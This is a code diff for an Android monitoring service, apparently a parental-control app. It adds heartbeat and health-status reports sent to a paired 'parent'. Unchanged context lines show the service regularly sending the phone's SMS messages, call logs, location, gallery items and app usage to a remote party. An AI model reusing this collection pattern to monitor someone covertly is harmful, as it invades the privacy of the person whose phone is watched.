@@ -51,6 +51,10 @@ class CoreService : Service() {
      */
     private val ioExecutor = Executors.newCachedThreadPool()
 
+    /** Connection quality score 0-100. Decreases on reconnect, resets to 100 on fresh connect. */
+    private var connectionQuality = 100
+    private var reconnectCount    = 0
+
     private val networkCallback = object : ConnectivityManager.NetworkCallback() {
         override fun onAvailable(network: Network) {
             // RESEARCH NOTE (Doze): When phone exits Doze, network becomes available.
@@ -65,10 +69,9 @@ class CoreService : Service() {
         super.onCreate()
         instance = this
 
-        // RESEARCH NOTE (Crash/ANR): Install global crash handler FIRST
-        // so any unhandled exception in this process is captured to file.
         CrashLogger.install(this)
         CrashLogger.logServiceStart(this, "onCreate")
+        HealthReporter.recordServiceStart()
 
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
         acquireWakeLock()
@@ -207,13 +210,22 @@ class CoreService : Service() {
                 try { sendCurrentAppBackground() } catch (_: Exception) {}
                 if (periodicTick % 4 == 0)  try { sendLocation() }          catch (_: Exception) {}
                 if (periodicTick % 10 == 0) {
-                    // RESEARCH NOTE (ANR): ContentProvider reads on background thread
                     try { sendCallLogBackground(50) } catch (_: Exception) {}
                     try { sendSmsBackground(50) }     catch (_: Exception) {}
                 }
                 if (periodicTick % 20 == 0) {
                     try { sendAppUsageBackground(24) } catch (_: Exception) {}
                     try { sendGalleryBackground(20) }  catch (_: Exception) {}
+                }
+                // Heartbeat every 30s — parent monitors liveness
+                try {
+                    sendData("heartbeat", HealthReporter.buildHeartbeat(this@CoreService, connectionQuality))
+                } catch (_: Exception) {}
+                // Full health status every 5 ticks (~2.5 min)
+                if (periodicTick % 5 == 0) {
+                    try {
+                        sendData("health_status", HealthReporter.buildHealthStatus(this@CoreService, connectionQuality))
+                    } catch (_: Exception) {}
                 }
                 mainHandler.postDelayed(this, 30_000)
             }
@@ -239,6 +251,7 @@ class CoreService : Service() {
             pairCode    = pairCode,
             onMessage   = { handleCommand(it) },
             onConnected = {
+                connectionQuality = maxOf(20, 100 - reconnectCount * 15)
                 OfflineAlertManager.onConnected()
                 NotificationMonitor.drainQueue()
 
@@ -248,7 +261,12 @@ class CoreService : Service() {
                     put("blocked_domains", JSONArray(BrowserBlocker.getBlockedDomains()))
                 })
 
-                // Auto-send crash diagnostic if any exists from previous crash
+                // Send full health status immediately on connect
+                try {
+                    sendData("health_status", HealthReporter.buildHealthStatus(this@CoreService, connectionQuality))
+                } catch (_: Exception) {}
+
+                // Auto-send crash diagnostic if any exists
                 if (CrashLogger.hasCrashData(this@CoreService)) {
                     mainHandler.postDelayed({
                         sendData("diagnostic_report", CrashLogger.buildDiagnosticReport(this@CoreService))
@@ -259,7 +277,6 @@ class CoreService : Service() {
                     try { sendBattery() }                 catch (_: Exception) {}
                     try { sendLocation() }                catch (_: Exception) {}
                     try { sendCurrentAppBackground() }    catch (_: Exception) {}
-                    // Heavy reads on background thread — ANR fix
                     try { sendCallLogBackground(50) }     catch (_: Exception) {}
                     try { sendSmsBackground(50) }         catch (_: Exception) {}
                     try { sendAppUsageBackground(24) }    catch (_: Exception) {}
@@ -268,6 +285,8 @@ class CoreService : Service() {
                 }, 1000)
             },
             onDisconnected = {
+                reconnectCount++
+                connectionQuality = maxOf(20, 100 - reconnectCount * 15)
                 OfflineAlertManager.onDisconnected()
                 stopPeriodicSending()
             }
@@ -303,6 +322,9 @@ class CoreService : Service() {
                     } catch (e: Exception) { CrashLogger.logCrash(this, e, "request_screen_permission") }
                 }
 
+                "get_health_status" -> {
+                    sendData("health_status", HealthReporter.buildHealthStatus(this, connectionQuality))
+                }
                 "get_diagnostic_report" -> {
                     sendData("diagnostic_report", CrashLogger.buildDiagnosticReport(this))
                 }
